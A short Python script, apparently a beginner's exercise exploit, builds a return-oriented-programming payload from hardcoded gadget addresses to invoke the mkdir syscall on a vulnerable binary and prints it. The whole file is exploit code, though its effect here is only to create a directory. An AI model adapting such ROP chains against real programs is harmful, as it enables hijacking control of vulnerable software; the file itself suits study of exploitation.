#!/usr/bin/env python
import os
import struct

rop1 = "\x13\x1d\x40\x00\x00\x00\x00\x00"
rop2 = "\x2c\x0e\x40\x00\x00\x00\x00\x00"
rop3 = "\x4f\x11\x40\x00\x00\x00\x00\x00"
rop4 = "\x11\x1d\x40\x00\x00\x00\x00\x00"
rop5 = "\x24\x06\x40\x00\x00\x00\x00\x00"
rop5_mid = "\x2a\x06\x40\x00\x00\x00\x00\x00"
rop6 = "\xbc\x08\x40\x00\x00\x00\x00\x00"
dirname = "my_first_exploit\x00"
buffer = "BBBBBB\x00"
offset = "\xd0\xff\xff\xff\xff\xff\xff\xff" #-48
syscall_num = "\x53\x00\x00\x00\x00\x00\x00\x00"
dir_flags = "\xed\x01\x00\x00\x00\x00\x00\x00" 
zeros = "\x00\x00\x00\x00\x00\x00\x00\x00" 

payload = dirname + buffer

#lotan attempt:
payload += rop2         #-->ret
payload += rop2         #-->rax
payload += rop5_mid     #-->ret
                        #rsp-->rbp
                        #<-- rip
                        #-->rax
payload += rop2         #-->ret
payload += rop4         #-->rax
payload += rop5         #-->ret
                        #<--rbp
                        #<--rip
                        #-->rsi(rip)
                        #-->r15(rbp)
payload += rop1         #-->ret
payload += offset       #-->rdi
payload += rop6         #-->ret
                        #rdi = &dirname
#finish syscall:
payload += rop2
payload += syscall_num
payload += rop4
payload += dir_flags
payload += dir_flags
payload += rop3

# hack = 'AAAABBBBCCCCDDDDEEEEFFFF\x13\x1d\x40\x00\x00\x00\x00\x00\x53\x00\x00\x00\x00\x00\x00\x00\x2c\x0e\x40\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00\x4f\x11\x40\x00\x00\x00\x00\x00'
print(payload)